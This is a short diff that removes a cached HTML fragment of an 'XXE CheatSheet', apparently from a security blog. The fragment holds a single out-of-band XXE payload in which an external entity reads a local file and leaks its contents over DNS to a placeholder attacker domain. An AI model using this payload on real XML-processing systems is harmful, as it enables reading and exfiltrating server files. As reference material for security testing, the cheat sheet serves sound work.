@@ -1,9 +1,0 @@
-I"Ž<h2 id="xxe-cheatsheet">XXE CheatSheet</h2>
-<p><br /></p>
-<h3 id="xxe-oob-over-dns">XXE-OOB-Over-DNS</h3>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!ENTITY % data SYSTEM "file:///tmp/foo"&gt;
-&lt;!ENTITY % url "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://%data;.my.evil.server'&gt;"&gt;
-</code></pre></div></div>
-<p><br />
-<br /></p>
-:ET
